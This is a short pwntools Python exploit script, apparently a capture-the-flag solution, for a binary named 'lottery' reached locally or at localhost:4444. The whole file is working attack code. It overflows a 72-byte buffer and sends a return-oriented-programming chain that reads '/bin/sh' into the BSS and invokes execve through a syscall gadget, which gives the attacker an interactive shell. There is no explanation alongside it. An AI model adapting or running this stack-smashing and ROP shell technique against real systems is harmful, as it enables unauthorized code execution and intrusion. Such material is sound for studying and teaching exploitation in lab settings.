#!/usr/bin/env python3
from pwn import *

exe = ELF("./lottery")
binary = "./lottery"
context.binary = exe
#context.log_level = "debug"
IP, PORT = "localhost", 4444

global io
breakpoints = '''
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
else:
    io = process(binary)
    gdb.attach(io, breakpoints)

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

bss = exe.bss()
pop_rax = 0x40100b
pop_rdi = 0x401253
pop_rsi = 0x4018ad
pop_rdx = 0x401255
syscall_ret = 0x403e77
syscall = 0x4016f9

payload = ("A"*72).encode()
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(syscall_ret)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall_ret)

reu(": ")
sl("3")
sl(payload)
rl()
sl("/bin/sh\x00")
io.interactive()